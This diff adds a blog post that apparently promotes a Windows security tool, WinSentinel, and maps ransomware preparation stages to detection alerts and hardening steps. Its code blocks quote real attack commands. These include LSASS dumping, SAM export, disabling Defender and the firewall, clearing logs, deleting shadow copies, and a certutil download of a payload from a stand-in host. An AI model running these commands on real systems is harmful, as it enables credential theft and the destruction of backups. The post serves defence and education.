@@ -60,6 +60,316 @@
 
   <div class="mt-12 space-y-12">
 
+    <!-- Post: Ransomware Pre-Encryption Detection -->
+    <article id="ransomware-pre-encryption-detection" class="border-b border-white/5 pb-10">
+      <time class="text-xs text-slate-500 uppercase tracking-wider">June 8, 2026</time>
+      <h2 class="mt-2 text-2xl font-bold text-white">The 47-Minute Window: Detecting Ransomware Before Encryption Begins</h2>
+      <p class="mt-3 text-slate-300">Ransomware operators spend an average of 47 minutes inside your network before triggering encryption. That window is your chance. Here's exactly what happens during those 47 minutes, which signals WinSentinel catches at each stage, and the concrete defensive actions that turn a potential disaster into a contained incident.</p>
+
+      <div class="prose mt-6">
+        <p>There's a persistent myth that ransomware is instant — you click a link, and your files are gone. In reality, modern ransomware operations are methodical. The Conti playbook (leaked in 2022) shows operators spending 30 minutes to 4 hours between initial access and encryption. Mandiant's 2025 M-Trends report puts the median ransomware dwell time at 5 days for enterprise targets, but for opportunistic attacks against small-to-medium businesses, the pre-encryption phase is compressed to under an hour.</p>
+
+        <p>That compressed window — roughly 47 minutes based on aggregated incident data from DFIR reports — is where defenders have their best opportunity. Not to prevent initial access (that already happened), but to detect the preparation activities that <em>must</em> occur before encryption can succeed. Kill those preparation steps, and the ransomware fails even though the attacker is already inside.</p>
+
+        <p>This post breaks down the pre-encryption phase minute by minute, maps each activity to specific WinSentinel detection capabilities, and provides the defensive scripts that interrupt the attack chain.</p>
+
+        <h2>Minute 0–5: Initial Foothold and Environment Validation</h2>
+
+        <p>The attacker has just gained execution — typically through a phishing payload, an exploited VPN appliance, or brute-forced RDP. Their first actions are always the same: validate the environment and confirm they're on a real target worth encrypting.</p>
+
+        <pre><code># Typical attacker reconnaissance (first 5 minutes):
+whoami /all
+net user /domain
+net group "Domain Admins" /domain
+wmic os get Caption,Version,BuildNumber
+wmic logicaldisk get Size,FreeSpace,DeviceName
+nltest /dclist:
+systeminfo | findstr /B /C:"OS" /C:"Domain"</code></pre>
+
+        <p>These commands answer three questions: Am I on a domain? How big is this network? Is there data worth encrypting? An attacker who lands on an isolated test VM with 20 GB of disk will move on. One who finds a domain-joined workstation with mapped drives to a file server will proceed.</p>
+
+        <p><strong>WinSentinel Detection:</strong> The Process Lineage module catches this immediately. A rapid sequence of system enumeration commands (<code>whoami</code>, <code>net user</code>, <code>systeminfo</code>, <code>wmic</code>) within 60 seconds is flagged as reconnaissance activity. More importantly, if these commands are spawned by an unusual parent — <code>wmiprvse.exe</code>, <code>mshta.exe</code>, or any Office process — it's a critical alert, not just informational.</p>
+
+        <pre><code># WinSentinel audit output at minute 3:
+[CRITICAL] Process Lineage: wmiprvse → cmd → whoami (T1047)
+[WARNING]  Rapid system enumeration detected (6 recon commands in 45s)
+[WARNING]  Process spawned from non-standard parent: mshta → cmd.exe</code></pre>
+
+        <h2>Minute 5–15: Privilege Escalation and Credential Harvesting</h2>
+
+        <p>The attacker now has situational awareness and needs admin privileges to proceed. Common escalation paths on Windows:</p>
+
+        <ul>
+          <li><strong>Token impersonation</strong> — Using tools like PrintSpoofer or JuicyPotato to escalate from service accounts to SYSTEM</li>
+          <li><strong>Unquoted service paths</strong> — Hijacking service binaries in paths with spaces that aren't properly quoted</li>
+          <li><strong>Credential dumping</strong> — Extracting cached credentials from LSASS memory using Mimikatz or comsvcs.dll MiniDump</li>
+          <li><strong>SAM database extraction</strong> — <code>reg save HKLM\SAM</code> and <code>reg save HKLM\SYSTEM</code> for offline cracking</li>
+        </ul>
+
+        <pre><code># Common privilege escalation indicators:
+# LSASS memory access (Mimikatz-style)
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [lsass-pid] dump.bin full
+
+# SAM extraction
+reg save HKLM\SAM C:\temp\sam.bak
+reg save HKLM\SYSTEM C:\temp\sys.bak
+
+# Token manipulation
+[System.Security.Principal.WindowsIdentity]::GetCurrent()
+New-Object System.Security.Principal.WindowsPrincipal(...)</code></pre>
+
+        <p><strong>WinSentinel Detection:</strong> The Credential Exposure module detects attempts to access LSASS memory, SAM database exports, and cached credential storage. The Event Log module catches Event ID 4672 (special privileges assigned) and Event ID 4648 (explicit credential use). Combined with Process Lineage detecting <code>rundll32</code> loading <code>comsvcs.dll</code> with a MiniDump argument, this stage generates multiple overlapping alerts.</p>
+
+        <pre><code># WinSentinel at minute 10:
+[CRITICAL] Credential Exposure: LSASS memory access detected (T1003.001)
+[CRITICAL] Event Log: Privilege escalation - new admin token (Event 4672)
+[WARNING]  Process Lineage: rundll32 → comsvcs.dll MiniDump (T1003.001)
+[WARNING]  Registry access: SAM hive export attempted</code></pre>
+
+        <h3>Defensive Action: Credential Guard</h3>
+
+        <p>The single most effective control against credential harvesting is Windows Credential Guard, which isolates LSASS in a Hyper-V protected container. With Credential Guard enabled, Mimikatz-style attacks against LSASS simply fail — the credentials aren't accessible to the operating system's kernel, let alone a user-mode process.</p>
+
+        <pre><code># Enable Credential Guard (requires UEFI Secure Boot + TPM 2.0)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
+
+# WinSentinel checks this automatically:
+winsentinel --audit --modules credential-security
+# Finding: "Credential Guard not enabled" → tells you exactly how to fix it</code></pre>
+
+        <h2>Minute 15–30: Defense Evasion — Blinding Your Security Tools</h2>
+
+        <p>This is the phase most defenders miss entirely. Before an attacker drops their encryption payload, they systematically disable everything that might detect or prevent it. The order is deliberate:</p>
+
+        <ol>
+          <li><strong>Disable Windows Defender</strong> — <code>Set-MpPreference -DisableRealtimeMonitoring $true</code> or registry manipulation</li>
+          <li><strong>Kill EDR processes</strong> — Using vulnerable drivers (BYOVD) to terminate security agent processes from kernel mode</li>
+          <li><strong>Clear event logs</strong> — <code>wevtutil cl Security</code> to destroy the forensic trail</li>
+          <li><strong>Disable audit policies</strong> — <code>auditpol /set /category:* /success:disable /failure:disable</code> to prevent new evidence</li>
+          <li><strong>Modify firewall rules</strong> — Open ports for lateral movement, disable firewall profiles</li>
+        </ol>
+
+        <pre><code># Real-world defense evasion sequence (from Conti playbook):
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+netsh advfirewall set allprofiles state off</code></pre>
+
+        <p><strong>WinSentinel Detection:</strong> This is where WinSentinel's Tamper Protection Audit shines. The module monitors Defender's operational state, checks whether tamper protection is enabled (preventing programmatic disable), and validates that firewall profiles are active. When Defender is disabled outside a defined maintenance window, it's an immediate critical alert.</p>
+
+        <pre><code># WinSentinel at minute 20:
+[CRITICAL] Defender: Real-time protection disabled (Event 5001)
+[CRITICAL] Defender: Tamper protection not enabled — attacker can disable AV
+[CRITICAL] Firewall: All profiles disabled (netsh command detected)
+[CRITICAL] Event Log: Security audit log cleared (Event 1102)
+[WARNING]  Audit Policy: Process creation auditing disabled
+
+# Kill Chain Assessment:
+# Phase 6 (Defense Evasion): ACTIVE — 5 indicators
+# Threat Level: CRITICAL
+# Progression Match: Ransomware Campaign (75% confidence, missing Impact phase)</code></pre>
+
+        <h3>Defensive Action: Tamper Protection + Protected Process Light</h3>
+
+        <p>Two controls make this phase significantly harder for attackers:</p>
+
+        <ul>
+          <li><strong>Windows Defender Tamper Protection</strong> — Prevents <code>Set-MpPreference</code> and registry-based disablement of Defender. Must be enabled via Windows Security UI or Intune (can't be set via script if it's currently off, by design).</li>
+          <li><strong>Protected Process Light (PPL)</strong> for LSASS — Runs LSASS as a protected process, preventing unsigned code from injecting or attaching. Combined with Credential Guard, this makes credential theft nearly impossible without a kernel exploit.</li>
+        </ul>
+
+        <pre><code># Enable LSASS PPL (requires reboot):
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+
+# Verify tamper protection status:
+Get-MpComputerStatus | Select-Object IsTamperProtected
+# Must return True — if False, fix via Windows Security → Virus &amp; Threat Protection</code></pre>
+
+        <h2>Minute 30–40: Backup Destruction and Recovery Sabotage</h2>
+
+        <p>This is the attacker's point of no return. Before detonating ransomware, they must ensure the victim can't simply restore from backups. Every ransomware variant includes backup destruction — it's not optional, it's core functionality:</p>
+
+        <pre><code># Universal ransomware backup destruction commands:
+vssadmin delete shadows /all /quiet
+wmic shadowcopy delete
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+wbadmin delete catalog -quiet
+Delete-WmiObject -Class Win32_ShadowCopy
+
+# Also common: stopping backup-related services
+net stop VSS
+net stop "SQL Server" /y
+net stop "SQL Server (MSSQLSERVER)" /y
+net stop wbengine
+net stop SDRSVC</code></pre>
+
+        <p>If these commands succeed, you've lost your recovery options. The data is still intact (encryption hasn't started), but recovery after encryption is now impossible without paying the ransom or restoring from offsite backups.</p>
+
+        <p><strong>WinSentinel Detection:</strong> The System Resilience module specifically checks for Volume Shadow Copy availability, backup service status, and recovery configuration. When <code>vssadmin delete shadows</code> is executed, it generates an immediate critical finding. The Kill Chain module recognizes this as Phase 13 (Impact preparation) and, combined with the Defense Evasion signals from earlier, elevates to a full Ransomware Campaign progression match.</p>
+
+        <pre><code># WinSentinel at minute 35:
+[CRITICAL] System Resilience: Volume Shadow Copies deleted (T1490)
+[CRITICAL] System Resilience: Windows Recovery disabled via bcdedit
+[CRITICAL] System Resilience: VSS service stopped
+[WARNING]  Process Lineage: cmd → vssadmin delete shadows (suspicious parent)
+
+# Kill Chain Update:
+# Phase 13 (Impact): ACTIVE — backup destruction confirmed
+# Progression: Ransomware Campaign at 100% confidence
+# ALL FOUR PHASES ACTIVE: Initial Access + Execution + Defense Evasion + Impact
+# VERDICT: ACTIVE RANSOMWARE ATTACK IN PROGRESS</code></pre>
+
+        <h3>Defensive Action: Protected Shadow Copies</h3>
+
+        <p>Preventing backup destruction requires layered controls:</p>
+
+        <ul>
+          <li><strong>VSS protection via WMI event subscription</strong> — Monitor for <code>vssadmin</code> execution and alert immediately. Better: use WDAC to restrict which processes can invoke vssadmin.</li>
+          <li><strong>Offsite backups</strong> — The only truly ransomware-proof backup is one the attacker can't reach from the compromised machine. Air-gapped or cloud backups with immutable retention.</li>
+          <li><strong>Controlled Folder Access</strong> — Windows 10/11 feature that prevents unauthorized processes from modifying files in protected directories. Won't save shadow copies, but protects document directories from encryption.</li>
+        </ul>
+
+        <pre><code># Enable Controlled Folder Access:
+Set-MpPreference -EnableControlledFolderAccess Enabled
+
+# Add protected folders beyond defaults:
+Add-MpPreference -ControlledFolderAccessProtectedFolders "D:\FileShares"
+Add-MpPreference -ControlledFolderAccessProtectedFolders "C:\Users\*\Documents"
+
+# WinSentinel checks this:
+winsentinel --audit --modules defender-security
+# Finding: "Controlled Folder Access not enabled" if it's off</code></pre>
+
+        <h2>Minute 40–47: Payload Staging and Pre-Encryption Setup</h2>
+
+        <p>The final phase before encryption: the attacker downloads or unpacks their encryption binary, configures it, and sets up the infrastructure for the ransom note display and key exchange.</p>
+
+        <pre><code># Payload staging indicators:
+# Large binary dropped to Temp or ProgramData
+certutil -urlcache -split -f http://c2.example/payload.exe C:\ProgramData\svchost.exe
+
+# Or decoded from base64 already on disk:
+certutil -decode C:\ProgramData\encoded.b64 C:\ProgramData\payload.exe
+
+# Process spawned from non-standard location:
+C:\ProgramData\svchost.exe --config ransom.cfg --ext .encrypted --note README_DECRYPT.txt
+
+# Network beacon to C2 for encryption key:
+# (Outbound connection to rare TLD or IP on non-standard port)</code></pre>
+
+        <p><strong>WinSentinel Detection:</strong> The Application Security module catches unsigned binaries executing from ProgramData or Temp. The Process Lineage module flags <code>certutil</code> being used for download/decode operations (T1140). Network Audit identifies outbound connections on non-standard ports. The convergence of all these signals at this stage produces the highest-confidence alert possible.</p>
+
+        <pre><code># WinSentinel at minute 44:
+[CRITICAL] App Security: Unsigned process running from C:\ProgramData\
+[CRITICAL] Process Lineage: certutil used for payload download (T1105/T1140)
+[CRITICAL] Network: Outbound connection to unclassified IP on port 8443
+[CRITICAL] Kill Chain: Ransomware Campaign — ENCRYPTION IMMINENT
+
+# Automated Response Recommendation:
+# 1. ISOLATE: Disconnect network immediately (net adapter disable)
+# 2. TERMINATE: Kill unsigned processes from staging directories
+# 3. PRESERVE: Image the disk before any remediation
+# 4. RESTORE: Re-enable Defender, restore shadow copies from backup</code></pre>
+
+        <h2>The Detection Stack: How Modules Work Together</h2>
+
+        <p>No single check catches a ransomware attack. It's the <em>combination</em> of modules firing in sequence that produces high-confidence detection. Here's how WinSentinel's modules layer:</p>
+
+        <ul>
+          <li><strong>Process Lineage</strong> — Catches suspicious parent-child relationships at every stage (initial execution, reconnaissance, payload staging)</li>
+          <li><strong>Event Log Analysis</strong> — Correlates authentication events, privilege escalation, and log tampering</li>
+          <li><strong>Defender Security</strong> — Monitors Defender state, tamper protection, Controlled Folder Access</li>
+          <li><strong>Credential Exposure</strong> — Detects LSASS access, SAM exports, credential caching weaknesses</li>
+          <li><strong>System Resilience</strong> — Validates backup availability, shadow copies, recovery configuration</li>
+          <li><strong>Network Audit</strong> — Identifies unauthorized listeners, suspicious outbound connections, disabled firewalls</li>
+          <li><strong>Kill Chain Reconstructor</strong> — Correlates findings from all modules into attack progression analysis</li>
+        </ul>
+
+        <p>Each module catches different phases. The Kill Chain Reconstructor is the integration layer that says "these 12 individual findings from 5 different modules, occurring within a 45-minute window, constitute a ransomware attack at the backup-destruction stage."</p>
+
+        <h2>The Defensive Checklist: Hardening Against Ransomware Pre-Encryption</h2>
+
+        <p>Run this WinSentinel audit and fix every finding marked Critical or Warning. Each one closes a gap that ransomware operators exploit during those 47 minutes:</p>
+
+        <pre><code># Full ransomware-focused audit:
+winsentinel --audit --modules credential-security,defender-security,process-lineage,eventlog,network,system-resilience
+
+# Key findings to fix immediately:
+# - Credential Guard not enabled → fix, blocks minute 5-15
+# - Tamper Protection off → fix, blocks minute 15-30
+# - LSASS not running as PPL → fix, blocks credential theft
+# - Controlled Folder Access off → fix, blocks encryption
+# - VSS not properly configured → fix, preserves recovery
+# - PowerShell in Bypass mode → fix, blocks execution
+# - RDP exposed without NLA → fix, blocks initial access
+
+# After fixing, verify:
+winsentinel --score
+# Target: 85+ with zero Critical findings in above modules</code></pre>
+
+        <h2>Response Automation: What To Do When You Detect It</h2>
+
+        <p>Detection without response is just watching yourself get breached in slow motion. Here's the response runbook for each detection threshold:</p>
+
+        <ul>
+          <li><strong>Single phase active (Moderate)</strong> — Investigate within 4 hours. Run full audit, check for additional indicators, review recent user activity.</li>
+          <li><strong>Two phases active (High)</strong> — Investigate immediately. Isolate the endpoint from the network (but don't power off — preserve memory). Run forensic collection.</li>
+          <li><strong>Three+ phases / Ransomware progression (Critical)</strong> — Incident response mode. Network isolate the machine AND any machine it communicated with in the last hour. Image the disk. Check backup integrity on all related systems. Assume lateral movement has occurred.</li>
+        </ul>
+
+        <pre><code># Emergency network isolation (run when Critical ransomware detected):
+Get-NetAdapter | Disable-NetAdapter -Confirm:$false
+
+# Terminate all unsigned processes from user-writable locations:
+Get-Process | Where-Object {
+    $_.Path -and ($_.Path -match 'Temp|AppData|ProgramData|Downloads') -and
+    !(Get-AuthenticodeSignature $_.Path).Status -eq 'Valid'
+} | Stop-Process -Force
+
+# Re-enable Defender if disabled:
+Set-MpPreference -DisableRealtimeMonitoring $false
+
+# Check shadow copy status:
+vssadmin list shadows
+# If empty → recovery may require offsite backups</code></pre>
+
+        <h2>Why 47 Minutes Is Enough — If You're Watching</h2>
+
+        <p>The attacker needs all four preparation phases to succeed. If <em>any one</em> is interrupted, the attack fails or is significantly degraded:</p>
+
+        <ul>
+          <li><strong>Block credential escalation</strong> (minute 5-15) → attacker can't get admin, can't disable defenses or delete backups</li>
+          <li><strong>Prevent defense evasion</strong> (minute 15-30) → Defender catches the encryption binary when it's dropped</li>
+          <li><strong>Protect backups</strong> (minute 30-40) → even if encryption occurs, you restore in hours instead of paying ransom</li>
+          <li><strong>Block payload staging</strong> (minute 40-47) → encryption never starts</li>
+        </ul>
+
+        <p>You don't need to catch everything. You need to catch <em>one thing</em> and respond fast enough to interrupt the chain. WinSentinel's layered detection gives you multiple opportunities across those 47 minutes — not one chance, but dozens of independent signals any one of which can trigger your response.</p>
+
+        <h2>Getting Started</h2>
+
+        <pre><code># Install and run the ransomware-focused audit:
+dotnet tool install --global WinSentinel.Cli
+winsentinel --audit
+
+# The kill chain analysis runs automatically.
+# Look for: Ransomware Campaign progression matches
+# Fix: every Critical finding in credential, defender, and resilience modules
+
+# For continuous monitoring across your fleet:
+# WinSentinel Pro agents report kill chain status every scan cycle,
+# alerting your team when any endpoint enters ransomware pre-staging.</code></pre>
+
+        <p>Ransomware isn't instant. It's a process with dependencies, and every dependency is a detection opportunity. Those 47 minutes are a gift — but only if your security tooling is watching for the right signals. Run <code>winsentinel --audit</code> now and close the gaps before someone tests them for real.</p>
+      </div>
+    </article>
+
     <!-- Post: Security Autopsy -->
     <article id="security-autopsy" class="border-b border-white/5 pb-10">
       <time class="text-xs text-slate-500 uppercase tracking-wider">June 8, 2026</time>
